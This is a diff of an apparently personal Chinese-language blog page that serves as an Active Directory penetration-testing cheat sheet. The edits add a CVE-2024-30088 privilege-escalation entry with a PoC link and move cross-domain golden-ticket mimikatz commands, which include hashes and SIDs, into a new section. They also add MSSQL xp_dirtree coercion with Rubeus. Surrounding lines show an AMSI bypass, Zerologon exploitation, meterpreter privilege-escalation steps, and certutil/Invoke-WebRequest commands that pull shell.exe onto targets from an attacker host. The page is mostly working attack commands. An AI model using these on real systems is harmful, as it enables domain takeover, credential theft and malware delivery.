@@ -10,7 +10,7 @@
 <meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
 <meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-23T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T19:40:56&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-05T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-05T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
 <meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
     </head>
@@ -385,6 +385,7 @@
         <li><a href="#cve-2025-24071压缩包解压触发ntlm回调">CVE-2025-24071（压缩包解压触发ntlm回调）</a></li>
         <li><a href="#cve-2025-33073基于dns服务错误导致ntlmrelay">CVE-2025-33073（基于dns服务错误导致ntlmrelay）</a></li>
         <li><a href="#cve-2020-1472-zerologon零登陆强行使计算机用户密码为零字节并且打dcsync">CVE-2020-1472 （ZeroLogon零登陆，强行使计算机用户密码为零字节，并且打dcsync）</a></li>
+        <li><a href="#cve-2024-_30088windows内核条件竞争提权">CVE-2024-_30088（windows内核条件竞争提权）</a></li>
       </ul>
     </li>
     <li><a href="#amsi绕过">amsi绕过</a>
@@ -533,11 +534,7 @@
       </ul>
     </li>
     <li><a href="#域万能密码">域万能密码</a></li>
-    <li><a href="#黄金票据">黄金票据</a>
-      <ul>
-        <li><a href="#跨域黄金票据">跨域黄金票据</a></li>
-      </ul>
-    </li>
+    <li><a href="#黄金票据">黄金票据</a></li>
     <li><a href="#黄金证书">黄金证书</a></li>
     <li><a href="#dcshadow">dcshadow</a>
       <ul>
@@ -565,6 +562,12 @@
         <li><a href="#创建root级用户劫持后门">创建root级用户劫持后门</a></li>
         <li><a href="#利用controlmaster劫持ssh后门">利用controlmaster劫持ssh后门</a></li>
         <li><a href="#etcprofiled自动后门部署">/etc/profile.d/自动后门部署</a></li>
+      </ul>
+    </li>
+    <li><a href="#跨域攻击相关">跨域攻击相关</a>
+      <ul>
+        <li><a href="#跨域黄金票据林内">跨域黄金票据（林内）</a></li>
+        <li><a href="#链接数据库强制认证林间或林内">链接数据库强制认证（林间或林内）</a></li>
       </ul>
     </li>
   </ul>
@@ -651,7 +654,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Aug 23, 2025</time>
+                <time class="article-time--published">Oct 05, 2025</time>
             </div>
         
 
@@ -937,7 +940,7 @@ powerview</p>
 </span></span></code></pre></div><h3 id="域相关">域相关
 </h3><h4 id="域信任">域信任
 </h4><p>nxc</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap 192.168.225.70 -u offsec -p lab -M enum_trusts --dns-server 192.168.225.70
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass --dc-list --dns-server $ip
 </span></span></code></pre></div><p>powershell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().GetAllTrustRelationships()
 </span></span></code></pre></div><h3 id="林相关">林相关
@@ -951,7 +954,11 @@ powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainForeignGroupMember -Domain corp2.com
 </span></span></code></pre></div><h3 id="adcs证书错误查询">ADCS证书错误查询
 </h3><h4 id="certify">certify
-</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Certify.exe find /vulnerable
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>老版本
+</span></span><span style="display:flex;"><span>Certify.exe find /vulnerable
+</span></span><span style="display:flex;"><span>新版本
+</span></span><span style="display:flex;"><span>Certify.exe enum-templates --filter-enabled --filter-vulne
+</span></span><span style="display:flex;"><span>rable --hide-admins
 </span></span></code></pre></div><h4 id="certipy-ad">certipy-ad
 </h4><p>用户密码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
@@ -1711,6 +1718,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> srvname from sysservers;
 </span></span></code></pre></div><p>在链接数据库上执行命令</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>EXECUTE <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;命令语句&#39;</span><span style="color:#f92672">)</span> at <span style="color:#f92672">[</span>$linked_db_name<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>注意单引号不省略，如果额外需要单引号，则双单引号转义
 </span></span></code></pre></div><h4 id="后渗透常用语法不是所有权限都需要sa但是默认具备">后渗透常用语法（不是所有权限都需要sa，但是默认具备）
 </h4><p>清理最近查询记录</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>DBCC FLUSHPROCINDB<span style="color:#f92672">(</span>DB_ID<span style="color:#f92672">())</span>;
@@ -2115,7 +2123,14 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python /opt/CVE-2020-1472/cve-2020-1472-exploit.py dc_name $ip
 </span></span></code></pre></div><p>直接空密码打dcsync</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump -no-pass -just-dc dc_name<span style="color:#ae81ff">\$</span>@$ip
-</span></span></code></pre></div><h2 id="amsi绕过">amsi绕过
+</span></span></code></pre></div><h3 id="cve-2024-_30088windows内核条件竞争提权">CVE-2024-_30088（windows内核条件竞争提权）
+</h3><p>提权因为需要条件竞争，所以需要耐心等待一会.但是超过半小时则失效，msf有poc但是有时候会打不通，所以可以使用这个工具。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/Zombie-Kaiser/CVE-2024-30088-Windows-poc
+</span></span></code></pre></div><h4 id="条件-3">条件
+</h4><p>1，需要目标环境shell权限
+2，确保目标没有2024年6月之后的补丁，目标为windows11及以下的全系列包括至少2022server</p>
+<p>没什么好说的，直接poc执行即可，使用链接poc需要修改软指定，需要个木马落地</p>
+<h2 id="amsi绕过">amsi绕过
 </h2><h3 id="osep-amsi">osep-amsi
 </h3><p>ps1或者txt源码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$a=[<span style="color:#66d9ef">Ref</span>].Assembly.GetTypes();<span style="color:#66d9ef">Foreach</span>($b <span style="color:#66d9ef">in</span> $a) {<span style="color:#66d9ef">if</span> ($b.Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*iUtils&#34;</span>) {$c=$b}};$d=$c.GetFields(<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span>);<span style="color:#66d9ef">Foreach</span>($e <span style="color:#66d9ef">in</span> $d) {<span style="color:#66d9ef">if</span> ($e.Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*Context&#34;</span>) {$f=$e}};$g=$f.GetValue($null);[<span style="color:#66d9ef">IntPtr</span>]$ptr=$g;[<span style="color:#66d9ef">Int32[]</span>]$buf = @(<span style="color:#ae81ff">0</span>);[<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::Copy($buf, <span style="color:#ae81ff">0</span>, $ptr, <span style="color:#ae81ff">1</span>)
@@ -3041,7 +3056,8 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>getpid	当前 Meterpreter PID
 </span></span><span style="display:flex;"><span>shell	获取目标交互式 cmd shell
 </span></span></code></pre></div><h3 id="权限相关操作">权限相关操作
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>getprivs	查看当前权限
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>use post/multi/recon/local_exploit_suggester 查找本地提权漏洞
+</span></span><span style="display:flex;"><span>getprivs	查看当前权限
 </span></span><span style="display:flex;"><span>run post/windows/escalate/getsystem	 提权为SYSTEM
 </span></span><span style="display:flex;"><span>load incognito → list_tokens -u → impersonate_token &lt;token&gt;	  模拟用户 Token 提权
 </span></span><span style="display:flex;"><span>run post/windows/escalate/uac	UAC 绕过尝试
@@ -3289,14 +3305,6 @@ sekurlsa::logonPasswords full
 </span></span></code></pre></div><p>黄金票据-Impacket</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-ticketer -nthash &lt;krbtgt NTLM hash&gt; -domain-sid &lt;SID&gt; -domain example.com administrator
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>administrator.ccache
-</span></span></code></pre></div><h3 id="跨域黄金票据">跨域黄金票据
-</h3><p>首先获取所需信息</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#跨域黄金票据，获取rc4——hash以及两域sid</span>
-</span></span><span style="display:flex;"><span>lsadump::trust /patch
-</span></span></code></pre></div><p>跨域黄金票据-远程-mimikatz-所需信任账号hash（伪造为目标域内用户并访问目标域）</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerberos::golden /user:wackymaker /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /rc4:973a5e843a63f94a7f643ff95f064d83 /service:krbtgt /target:corp1.com /ticket:wackymaker.kirbi
-</span></span></code></pre></div><p>跨域黄金票据-本地-mimikatz-所需当前域krbtgt.hash（伪造成本域用户并访问目标域）</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerberos::golden /user:administrator /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ticket:admin_tgt.kirbi
 </span></span></code></pre></div><h2 id="黄金证书">黄金证书
 </h2><p>先利用域管理权限获得CA 的私有签名密钥</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy ca -u administrator@$domain -hashes :$hash -target $CA_FQDN -ns $ip -config $CA_FQDN<span style="color:#ae81ff">\$</span>CA -backup
@@ -3486,6 +3494,37 @@ sekurlsa::logonPasswords full
 </ul>
 </li>
 </ol>
+<h2 id="跨域攻击相关">跨域攻击相关
+</h2><p>注意跨域包括了林内跨域以及林外跨域，因为存在sid筛选，两者是有明显区分，林间会相对难以攻击但也不是完全没有手段</p>
+<h3 id="跨域黄金票据林内">跨域黄金票据（林内）
+</h3><p>优先考虑子域跨域到主域，没有开启sidhistory的林间域信任无法攻击</p>
+<p>参考文章</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72
+</span></span></code></pre></div><p>首先获取所需信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#跨域黄金票据，获取rc4——hash以及两域sid</span>
+</span></span><span style="display:flex;"><span>lsadump::trust /patch
+</span></span></code></pre></div><p>跨域黄金票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;Kerberos::golden 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/user: Administrator 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/domain: dollarcorp.moneycorp.local [child_domain]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/sid: child_sid
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/sids: root_sid
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/rc4: Ticket HASH 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/service:krbtgt 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/target:moneycorp.local [root domain]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/ticket: location to save the ticket&#34;&#39;</span>
+</span></span></code></pre></div><h3 id="链接数据库强制认证林间或林内">链接数据库强制认证（林间或林内）
+</h3><p>开启双向信任的委派攻击，所需目标域的mssql_xp_dirtree权限，以及拥有的另外一个域的dc_system权限</p>
+<p>示例mssql服务</p>
+<pre tabindex="0"><code class="language-环境" data-lang="环境">dc01.test1.com部署了mssql并且我们已经拥有xp_dirtree命令权限
+dc01.test2.com我们已经有了dc的_system权限
+两个是链接数据库（暂时不确定是否为必须权限，只是记录已攻击过案例）
+两个域双向信任属于林间信任
+</code></pre><p>使用鲁博在dc01.test2.com监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe monitor /interval:5 /nowrap
+</span></span></code></pre></div><p>在dc01.test1.com的数据库中触发smb认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>xp_dirtree <span style="color:#ae81ff">\\</span>dc01.test2.com<span style="color:#ae81ff">\n</span>owrap
+</span></span></code></pre></div><p>成功则会截获dc01.test1.com_tgt</p>
 <h1 id="小技巧">小技巧
 </h1><h3 id="杀掉进程">杀掉进程
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>taskkill /F /IM shell.exe
@@ -3530,7 +3569,7 @@ linux换行</p>
 </span></span></code></pre></div><h3 id="windows上传文件">windows上传文件
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
-</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">22</span>/LansweeperDecrypt.ps1 C:\windows\tasks\LansweeperDecrypt.ps1
+</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">2</span>/Rubeus-<span style="color:#ae81ff">472</span>.exe C:\windows\tasks\<span style="color:#ae81ff">6</span>.exe
 </span></span><span style="display:flex;"><span>powershell
 </span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents&#34;</span>
 </span></span><span style="display:flex;"><span>或者
@@ -3773,6 +3812,80 @@ linux换行</p>
     
 
     
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/delegate/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Delegate-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/redelegate/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Redelegate-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/baby/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">baby-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sendai/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sendai-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/adcsmake/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ca管理员权限解析及利用发布恶意模板攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
 
      
     
